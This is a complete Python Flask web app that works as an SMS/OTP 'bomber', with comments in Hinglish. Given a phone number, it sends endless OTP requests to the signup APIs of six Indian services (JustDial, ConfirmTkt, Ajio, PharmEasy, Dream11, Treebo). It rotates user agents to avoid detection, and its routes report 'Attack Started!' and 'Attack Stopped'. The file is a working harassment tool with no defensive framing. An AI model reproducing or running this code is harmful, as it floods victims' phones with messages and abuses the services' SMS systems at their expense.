import os
import time
import requests
import threading
import random
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)
active_tasks = {}

# List of User Agents taaki har baar naya browser lage
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
]

def send_bomber(mobile):
    count = 1
    session = requests.Session()
    
    while active_tasks.get(mobile):
        # Har round mein naya header
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "application/json",
            "Referer": "https://www.google.com/"
        }
        
        print(f"--- Round {count} for {mobile} ---")
        
        # 1. JustDial
        try: session.get(f"https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php?mobile={mobile}", headers=headers, timeout=5)
        except: pass

        # 2. ConfirmTkt
        try: session.post("https://securedapi.confirmtkt.com/api/platform/register", json={"mobileNumber": mobile}, headers=headers, timeout=5)
        except: pass

        # 3. Ajio
        try: session.post("https://login.web.ajio.com/api/auth/signupSendOTP", json={"mobileNumber": mobile}, headers=headers, timeout=5)
        except: pass

        # 4. PharmEasy
        try: session.post("https://pharmeasy.in/api/auth/requestOTP", json={"contactNumber": mobile}, headers=headers, timeout=5)
        except: pass

        # 5. Dream11
        try: session.post("https://api.dream11.com/sendsmslink", json={"mobileNum": mobile}, headers=headers, timeout=5)
        except: pass

        # 6. Treebo
        try: session.post("https://www.treebo.com/api/v2/auth/login/otp/", json={"phone_number": mobile}, headers=headers, timeout=5)
        except: pass

        print(f"Round {count} Complete.")
        count += 1
        
        # NOTE: 1 second ka gap bohot kam hai. 
        # Agar block se bachna hai toh kam se kam 15-20 seconds rakhein.
        time.sleep(2) 

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start', methods=['POST'])
def start_bomber():
    mobile = request.form.get('mobile')
    if not mobile or len(mobile) != 10:
        return jsonify({"status": "error", "message": "Invalid Number"})
    
    # Purane task ko band karke naya start karna
    active_tasks[mobile] = True
    t = threading.Thread(target=send_bomber, args=(mobile,))
    t.daemon = True # Thread ko background mein chalne dein
    t.start()
    return jsonify({"status": "success", "message": "Attack Started! (Wait for delivery)"})

@app.route('/stop', methods=['POST'])
def stop_bomber():
    mobile = request.form.get('mobile')
    if mobile in active_tasks:
        active_tasks[mobile] = False
    return jsonify({"status": "success", "message": "Attack Stopped"})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
